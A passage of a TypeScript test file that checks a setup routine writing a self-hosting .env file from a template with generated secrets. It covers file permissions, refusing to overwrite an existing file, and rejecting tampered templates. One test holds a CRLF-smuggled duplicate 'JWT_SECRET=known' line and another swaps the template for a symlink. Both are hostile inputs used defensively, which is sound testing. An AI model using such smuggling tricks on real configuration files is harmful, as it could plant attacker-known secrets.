				expect([...content.matchAll(new RegExp(`^[ \\t]*(?:export[ \\t]+)?${key}[ \\t]*[=:]`, "gm"))].length, key).toBe(1);
			}
		});

		it("refuses a template that also carries a CRLF-smuggled duplicate", async () => {
			const { deps, created } = fakeDeps(`${TEMPLATE.replace(/\n/g, "\r\n")}JWT_SECRET=known\r\n`);
			expect(await setupStackEnv(STACK, deps)).toBe("failed");
			expect(created).toEqual([]);
		});
	});

	describe("on disk", () => {
		let dir: string;
		beforeEach(async () => {
			dir = await mkdtemp(path.join(os.tmpdir(), "ao-local-server-setup-"));
			await writeFile(path.join(dir, ".env.example"), TEMPLATE);
		});
		afterEach(() => rm(dir, { recursive: true, force: true }));
		const stack = () => ({ dir, file: path.join(dir, "docker-compose.selfhost.yml") });

		it("creates .env with mode 0600 and the generated secrets", async () => {
			expect(await setupStackEnv(stack(), nodeSetupDeps((size) => Buffer.alloc(size, 7)))).toBe("created");
			expect((await stat(path.join(dir, ".env"))).mode & 0o777).toBe(0o600);
			expect(await readFile(path.join(dir, ".env"), "utf8")).toContain(`JWT_SECRET=${"07".repeat(32)}`);
		});

		it("never overwrites an existing .env", async () => {
			await writeFile(path.join(dir, ".env"), "JWT_SECRET=mine\n");
			expect(await setupStackEnv(stack(), nodeSetupDeps(counter()))).toBe("already_set_up");
			expect(await readFile(path.join(dir, ".env"), "utf8")).toBe("JWT_SECRET=mine\n");
		});

		it("fails without writing when the template is missing or a symlink", async () => {
			await rm(path.join(dir, ".env.example"));
			expect(await setupStackEnv(stack(), nodeSetupDeps(counter()))).toBe("failed");
			await writeFile(path.join(dir, "elsewhere"), TEMPLATE);
			await symlink(path.join(dir, "elsewhere"), path.join(dir, ".env.example"));
			expect(await setupStackEnv(stack(), nodeSetupDeps(counter()))).toBe("failed");
			await expect(stat(path.join(dir, ".env"))).rejects.toThrow();
		});

		it("returns only an outcome word, never the content", async () => {
			const deps: SetupDeps = { ...nodeSetupDeps(counter()), createFile: async () => undefined };
			expect(await setupStackEnv(stack(), deps)).toBe("created");
		});
	});
});
